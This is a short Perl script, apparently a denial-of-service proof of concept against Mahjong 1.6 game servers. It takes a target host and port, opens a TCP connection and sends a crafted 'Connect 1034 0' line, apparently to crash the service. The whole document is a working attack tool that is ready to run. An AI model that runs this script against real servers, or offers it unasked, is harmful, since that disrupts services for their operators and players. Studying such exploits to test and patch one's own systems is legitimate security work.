#!/usr/bin/perl -s
use IO::Socket;
# test it in slackware 9.0
# DOS-test--mj1.6--code by jsk
# mahJong 1.6, all versions of mahjong
if(!$ARGV[0] || !$ARGV[1])
 { print "usage: ./dosmj.pl <host> <port>\n"; exit(-1); }

$host = $ARGV[0];
$port = $ARGV[1];
$jsk ="Connect 1034 0";
$socket = new IO::Socket::INET (
 Proto => "tcp",
 PeerAddr => $host,
 PeerPort => $port);

die "unable to connect to $host:$port ($!)\n" unless $socket;
print $socket "Connect 1034 0";
print $socket "\r\n";
close($socket);
